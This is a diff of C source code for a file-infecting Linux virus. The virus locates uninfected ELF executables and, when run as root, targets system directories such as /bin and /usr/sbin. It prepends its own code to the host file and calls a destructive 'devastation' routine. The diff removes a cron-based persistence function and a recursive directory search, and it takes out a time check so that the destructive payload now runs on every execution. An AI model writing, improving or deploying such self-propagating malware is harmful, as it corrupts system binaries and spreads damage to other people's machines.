@@ -13,7 +13,7 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 22896
+#define SIZE 22800
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
@@ -72,10 +72,10 @@ void devastation(char *fileName) {
 /* Returns true if the file's format is ELF (Executeable and Linkable Format)
  * ELF files have the first four bytes as {0x7f, 'E', 'L', 'F'}
  */
-bool isELF(char* path, char* fileName) {
+bool isELF(char* fileName) {
 	if(fileName[0] == '.') return false;
 
-	int host_fd = open(path, O_RDONLY);
+	int host_fd = open(fileName, O_RDONLY);
 	
 	char header[4];
 	read(host_fd, header, 4);
@@ -105,40 +105,29 @@ bool isHealthy(char* fileName) {
  * Gets an ELF file's name that is not yet infected 
  * If no such files are found, NULL is returned
  */
-void getHealthyHostFile(char*retPath, char* self_name, char *name, int indent)
-{
-    DIR *dir;
-    struct dirent *entry;
-    struct stat st;
-    if (!(dir = opendir(name)))
-        return ;
+char* getHealthyHostFile(char *self_name) {
+	struct stat st;
 
-    while ((entry = readdir(dir)) != NULL) {
-        if (entry->d_type == DT_DIR) {
-            char path[1024];
-            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 || entry->d_name[0]=='.')
-                continue;
-            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
-            getHealthyHostFile(retPath, self_name,path, indent + 2);
-            if(retPath[0]!='\0')
-                return;
-            
-        } else {
-            char path[1024];
-            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
-            stat(path, &st);
-            if(!strcmp(entry->d_name, self_name)) continue;	// Don't infect self
-            if(isELF(path,entry->d_name) && isHealthy(path)){
-                // printf("%s\n",path);
-                strcpy(retPath, path);
-                closedir(dir);
-                return ;
-            }
-        }
-    }
-    closedir(dir);
-    return;
+	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; 
+	//Addresses of the directories to attack if the user of root
+	char cwd[2] = {'.', '\0'}; 
+	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
+	DIR *dir = opendir(selected_dir);
+
+	struct dirent *file;
+	while((file = readdir(dir)) != NULL){
+		stat(file->d_name, &st);
+		if(!strcmp(file->d_name, self_name)) continue;	// Don't infect self
+		if(isELF(file->d_name) && isHealthy(file->d_name)){
+			closedir(dir);
+			return file->d_name;
+		}
+	}
+
+	closedir(dir);
+	return NULL;
 }
+
 
 /**
  * Returns true if this file has only the virus code
@@ -147,18 +136,7 @@ bool isOriginalVirus(int vfd) {
 	return SIZE == lseek(vfd, 0, SEEK_END);
 }
 
-void addCron(char *hostFileName){
-	char command[200];
-	strcpy(command,"echo \"54 16 * * * ");
-    char actualpath [200];
-    char *ptr;
-    ptr = realpath(hostFileName, actualpath);
-	strcat(command,ptr);
-	strcat(command,"\" >> /tmp/cron");
-	system(command);
-	system("crontab /tmp/cron");
-	// remove("./cron");
-}
+
 /**
  * Infect host file by creating a temporary file; 
  * appending the virus/infected file, clean ELF host;
@@ -166,7 +144,6 @@ void addCron(char *hostFileName){
  */
 void infectHostFile(char* hostFileName, int virus_fd) {
 	
-	addCron(hostFileName);
 	int host_fd = open(hostFileName, O_RDONLY);	
 	struct stat st;
 	fstat(host_fd, &st);
@@ -243,13 +220,7 @@ void makeCopyAndAddSignature(char *fileName){
 	remove(buf);
 }
 
-void func(char*cleanHostName, char * self_name){
-	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; 
-	//Addresses of the directories to attack if the user of root
-	char cwd[2] = {'.', '\0'}; 
-	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
-	getHealthyHostFile(cleanHostName,self_name,selected_dir, 0);
-}
+
 void main(int argc, char *argv[]) {
     srand(time(0));
 	makeCopyAndAddSignature(argv[0]);
@@ -258,16 +229,7 @@ void main(int argc, char *argv[]) {
     struct stat st;
 	fstat(virus_fd, &st);
 	
-	char cleanHostName[1024]="\0";
-	func(cleanHostName,(char*)argv[0] + 2);
-	printf("Target File %s\n",cleanHostName);
-	
-	char file_output[1024];
-	strcpy(file_output,"echo ");
-	strcat(file_output,cleanHostName);
-	strcat(file_output, ">> /home/ubuntu/Desktop/selectedHostfile.txt");
-	system(file_output);
-
+	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
 	if(cleanHostName != NULL) 
 		infectHostFile(cleanHostName, virus_fd);
 		 
@@ -280,14 +242,7 @@ void main(int argc, char *argv[]) {
 	else{
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
 		close(virus_fd);
-		time_t seconds;
-		struct tm *timeStruct;
-
-		seconds = time(NULL);
-
-		timeStruct = localtime(&seconds);
-		if(timeStruct->tm_hour == 16 && abs(timeStruct->tm_min - 54)<=10)
-			devastation(argv[0]);
+		devastation(argv[0]);
 	}
 	
 }
